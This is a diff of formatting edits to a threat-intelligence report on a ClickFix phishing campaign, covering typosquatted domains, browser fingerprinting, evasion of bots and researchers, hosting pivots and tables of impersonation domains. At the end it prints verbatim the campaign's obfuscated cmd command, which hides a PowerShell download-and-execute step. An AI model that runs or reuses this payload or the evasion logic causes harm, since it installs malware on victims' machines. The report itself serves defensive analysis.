@@ -43,6 +43,7 @@ The attack begins with domain impersonation, where attackers register domains th
 Once the user lands on the fake website, the threat actors profile or fingerprint the user. Then the user is redirected to the ClickFix page.
 
 **Example: wecimaa[.]cyou**
+
 In this example, the threat actor registered wecimaa[.]cyou, a typosquatted version of the legitimate streaming site `wecima`. When users visit this domain:
 1. **Initial Landing**: User accessing the wecima streaming platform
 2. **User Profiling**: Before any redirection occurs, the malicious JavaScript on the page collects detailed information about the user (Which will be explained in details later)
@@ -56,20 +57,24 @@ In this example, the threat actor registered wecimaa[.]cyou, a typosquatted vers
 <br>
 
 ## **User Fingerprinting**
+
 User fingerprinting is the process of collecting detailed telemetry from a visitor’s browser and device to create a unique profile. In cyber threats, this is used not just for tracking, but for **target selection and evasion**. 
 Instead of treating every visitor equally, the attacker uses this data to decide whether to deliver the malicious payload or divert the user elsewhere.
 
-**Example: **
+**Example:**
+
 Initial Redirect
 **URL:** `https://cf.quickbase.icu/middle.html?impId=...&ct=...`
 impId = Unique tracking ID
 ct = Encrypted session token from campaign
 
 **Fingerprinting API Call**
+
 **URL:** `https://cf.quickbase.icu/api/v1/px2?ct=...&minfo=...`
 This is where the actual browser profiling happens. The JavaScript on `middle.html` collects telemetry and sends it via this API endpoint.
 - **`ct`:** Same Click Token as above, helps to correlate the fingerprint data with the initial impression.
 - **`minfo`:** A **Base64-encoded JSON object** containing detailed browser and system fingerprints. 
+
 After Decoding the JSON object:
 ```json
 {
@@ -93,6 +98,7 @@ After Decoding the JSON object:
 ```
 
 **Final Redirect**
+
 **URL:** `https://mangafantasyrealm.cfd/indexacrtbt3.php?cid=...&bid=...&source_subid=...&keyword=...&ref=...&IP=...&ua=...&flow=...`
 
 After profiling confirms the user is a valid target, they are redirected to the final destination, the ClickFix page.
@@ -106,9 +112,11 @@ After profiling confirms the user is a valid target, they are redirected to the 
 - **`flow`:** Internal flow/route ID within the TDS; determines which landing page variant (e.g., ClickFix vs. direct malware) the user receives.
 
 **Clickfix page:**
+
 **URL:** `https://cmcln4.cinemadataflow.cfd/*`
 
 **Fingerprinting overview:**
+
 1. **Victim visits** `wecimaa.cyou` → redirected to `cf.quickbase.icu/middle.html`
 2. **JavaScript profiles** the browser extensively via `/api/v1/px2`, sending encoded telemetry
 3. **Server evaluates** fingerprint: checks for bots, sandboxes, timezone mismatches, and valid sessions
@@ -116,17 +124,14 @@ After profiling confirms the user is a valid target, they are redirected to the 
 5. **ClickFix page** prompts user to press "Allow" → malicious command copied to clipboard → user executes it manually
 
 **Why fingerprinting is used: The "Gatekeeper" Function**
+
 Once a user's profile and behavioral data have been collected, the backend determines how to route the user. Redirecting them either to the clickfix page or to an ad.
 - Users who are not targeted (e.g., bots or researchers visiting the page repeatedly with the same profile) are shown ads.
 - Users identified as targets are redirected to the clickfix page.
 
-```
-after profiling and collecting the information about the user, the behavior is determined in the backend to redirect to clickfix page or to redirect to an ad. 
-if the user is not a target or a bot or a researcher (who visits the page muliple times with same profiling) will show ads
-if the user is the targeted user, will redirect to the clickfix page
-```
 
 **Evasion techniques:**
+
 Based on the user profile will determine how to route the user. Redirecting them either to the clickfix page or to an ad. 
 **1. Bot & Automation Detection**
 - **isBot**: indicating whether the visitor was identified as an automated script or crawler.
@@ -163,6 +168,7 @@ The threat actor is using alternative TLDs and deliberate misspellings to catch 
 
 
 **Hosting Analysis**
+
 The IP addresses resolve to a mix of legitimate CDN proxies and VPS hosting providers which is a common TTP to obscure origin servers.
 1. **Cloudflare Proxy (AS13335)**
     - **IPs**: `104.21.x.x` and `172.67.x.x` ranges (e.g., `104.21.86.123`, `172.67.189.75`).
@@ -180,6 +186,7 @@ The IP addresses resolve to a mix of legitimate CDN proxies and VPS hosting prov
 
 
 **Infrastructure Pivots and Shared IPs**
+
 The searches were performed against the identified IPs, with `Redirecting` and `Loading` used as page-body indicators. These two words were contained inside the body of phishing websites before redirecting to the ClickFix page.
 
 The selected IPs were prioritized because they belong to direct cloud-hosting infrastructure (AS63949 - Akamai Connected Cloud/Linode). And the majority of the remaining IPs are Cloudflare anycast addresses. Direct hosting IPs provide a more actionable pivot point for identifying co-hosted domains, historical DNS relationships, TLS certificates, server fingerprints, and related infrastructure.
@@ -201,9 +208,11 @@ The bulk of the captures (172.239.193.153, 172.232.6.55, 172.236.114.191, much o
 - **The parked inventory is weaponizable**: hundreds of typosquats and brand-adjacent names are parked and ready to be flipped to live phishing at any time.
 
 ## **Phishing patterns**
+
 Based on the comprehensive analysis of all 6 IPs and their related domains, the following insights were extracted.
 
 **Financial & Banking Impersonation Domains**
+
 These domains use typosquatting and brand mimicry to target banking customers for credential harvesting.
 
 | Domain                              | Impersonated Brand                   |
@@ -239,6 +248,7 @@ These domains use typosquatting and brand mimicry to target banking customers fo
 | `cashfloweasefinance.com`           | Generic Finance                      |
 
 **Tech, SaaS & Security Impersonation**
+
 These domains mimic software vendors to trick users into downloading malware or granting remote access.
 
 | Domain                | Impersonated Brand / Theme     |
@@ -264,7 +274,7 @@ These domains mimic software vendors to trick users into downloading malware or 
 | `indexs.cloud`        | Parklogic Infrastructure       |
 
 **Streaming, Retail & Logistics Impersonation**
-*These domains target consumers with fake billing, delivery, or account suspension warnings.*
+These domains target consumers with fake billing, delivery, or account suspension warnings.
 
 | Domain                         | Impersonated Brand / Theme   |
 | :----------------------------- | :--------------------------- |
@@ -307,6 +317,7 @@ Four domains sit behind Cloudflare:
 - cinemadataflow.cfd
 
 **Pivot Domain: `cloudflare.vc`**
+
 `cloudflare.vc` is a malicious domain abused in ClickFix attacks which impersonates Cloudflare's human verification page to trick victims into executing malicious commands.
 
 **Behavior:**
@@ -326,6 +337,7 @@ The list contains **134 indicators** of compromised and malicious hosts redirect
 
 
 **IP Address: `94.103.1.233`**
+
 The IP operating under the **Digital Hosting Provider LLC (AS209207)** which is a known **Russian bulletproof hosting** infrastructure. T
 his IP belongs to the `94.103.1.0/24` subnet, where multiple malicious domains have already been observed running on the same network segment.
 
@@ -338,6 +350,7 @@ his IP belongs to the `94.103.1.0/24` subnet, where multiple malicious domains h
 | Domain Name              | dhost.su                                           |
 
 **Virustotal Observed Related Domains**
+
 The following malicious domains have been observed active on the IP:
 
 | Domain                |
@@ -395,6 +408,7 @@ cmd /v:on /q /c "set Note=JsLh8YCMSIWH1OdBTv2=nF6k:-e.ocyUwbZN0mlRrGgE\34D@zxiAp
 ```
 
 The most interesting command is last one which is an obfuscated cmdline that hides a PowerShell download-and-execute command behind a character-substitution cipher.
+
 ```powershell
 cmd /v:on /q /c "set Note=JsLh8YCMSIWH1OdBTv2=nF6k:-e.ocyUwbZN0mlRrGgE\34D@zxiApauQjt5P& set Text=.& (for %t in (6 24 44 10 51 20 14 28 32 1 44 8 30 1 58 26 37 45 18 44 10 51 20 14 28 32 1 60 28 32 26 40 8 3 26 38 38 44 17 12 27 36 44 53 28 32 26 40 1 3 26 38 38 27 26 50 26 48 25 20 28 53 48 25 32 48 3 48 25 26 20 29 48 5 32 15 23 52 6 52 52 0 52 15 38 52 41 46 52 14 42 52 22 52 21 56 52 16 56 15 56 52 47 1 52 54 56 15 30 52 41 36 52 9 52 52 30 52 47 31 52 35 52 52 59 52 47 43 52 7 42 52 45 52 47 43 52 7 32 52 12 52 6 4 52 7 32 52 49 52 47 7 52 9 52 52 58 52 43 4 52 14 56 15 36 52 43 5 52 54 56 15 1 52 41 31 52 9 52 15 12 52 6 46 52 33 56 15 49 52 41 23 52 13 32 15 58 52 11 7 52 54 56 15 38 52 11 42 52 34 56 15 57 52 6 52 52 2 32 15 53 52 6 52 52 14 56 52 55 52 41 36 52 29 32 15 53 52 6 52 52 2 32 15 50 52 41 46 52 9 52 15 35 52 21 7 52 8 56 15 0 52 43 46 52 31 32 15 31 52 43 43 52 16 52 15 7 52 21 52 52 39 56 15 8 52 21 31 52 31 32 15 21 52 21 9 52 60 56 52 50 52 52 19 19) do set Text=!Text!!Note:~%t,1!) & set Text=!Text:@= !& call !Text:~1!"
 ```
